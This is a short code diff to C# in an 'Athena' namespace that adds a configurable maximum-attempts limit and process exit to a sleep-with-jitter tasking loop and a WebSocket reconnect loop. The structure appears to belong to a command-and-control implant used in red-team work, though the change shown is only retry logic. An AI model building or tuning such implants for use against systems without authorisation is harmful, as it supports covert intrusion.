@@ -69,6 +69,10 @@ namespace Athena
             this.cts = new CancellationTokenSource();
             while (!cts.Token.IsCancellationRequested)
             {
+                if (this.currentAttempt > this.maxAttempts)
+                {
+                    Environment.Exit(0);
+                }
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
@@ -155,7 +159,7 @@ namespace Athena
 
                 while (ws.State != WebSocketState.Open)
                 {
-                    if (this.connectAttempts == 300)
+                    if (this.connectAttempts == this.maxAttempts)
                     {
                         Environment.Exit(0);
                     }
